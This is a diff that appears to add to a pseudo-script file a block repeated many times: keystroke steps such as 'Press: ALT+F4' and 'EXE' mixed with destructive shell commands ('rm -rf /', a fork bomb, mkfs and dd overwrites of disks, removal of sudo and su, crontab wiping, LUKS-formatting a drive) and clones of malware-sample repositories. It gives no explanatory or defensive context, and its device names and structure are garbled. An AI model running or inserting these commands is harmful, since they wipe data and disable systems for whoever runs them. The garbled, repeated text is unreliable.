@@ -1,22 +1,5 @@
 <off>
-<up>
-<up>
-<up>
-<up>
-<off>
-<up>
-<up>
-<up>
-<up>
-<off>
-<up>
-<up>
-<up>
-<up>
-<off>
-<up>
-<up>
-<off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -70,6 +53,7 @@ Press: ALT+F4
 Press: CTRL+V
 Press: EXE
 <off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -122,6 +106,8 @@ Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
+<off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -174,6 +160,8 @@ Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
+<off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -226,6 +214,8 @@ Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
+<off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -278,6 +268,8 @@ Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
+<off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -330,6 +322,8 @@ Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
+<off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -382,6 +376,8 @@ Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
+<off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -434,6 +430,8 @@ Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
+<off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
@@ -486,6 +484,1088 @@ Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
